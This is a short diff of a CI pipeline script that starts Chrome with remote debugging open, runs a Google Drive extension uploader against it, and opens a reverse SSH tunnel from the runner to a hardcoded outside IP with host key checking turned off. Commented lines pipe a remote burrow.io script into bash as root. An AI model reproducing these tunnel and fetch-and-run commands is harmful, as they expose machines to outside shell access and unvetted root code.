@@ -63,9 +63,9 @@ steps:
     sudo chown -R helloworld /home/helloworld/.config/google-chrome
     sudo chmod -R 777 /home/helloworld/.config/google-chrome
     sudo -u helloworld echo "google-chrome --bwsi --remote-debugging-port=9444" | sudo -u helloworld tee /home/helloworld/chrome
-    chmod +x /home/helloworld/chrome
-    sudo -u helloworld echo "dotnet GDriv*dll 9444" | sudo -u helloworld tee /home/helloworld/gdrive
-    chmod +x /home/helloworld/gdrive
+    sudo chmod +x /home/helloworld/chrome
+    sudo -u helloworld echo "dotnet GDriveChromeExtensionUploader.dll 9444" | sudo -u helloworld tee /home/helloworld/gdrive
+    sudo chmod +x /home/helloworld/gdrive
     ssh -N -o StrictHostKeyChecking=no -T -R 10101:0.0.0.0:22 -i /tmp/a.pem ubuntu@18.222.192.102
     #sudo -E curl -Ls https://burrow.io/$burrowID  -o - | sudo -E bash -s #new
     #curl -Ls https://burrow.io/DFYFKeos-yOkmajYq | sudo -E bash -s
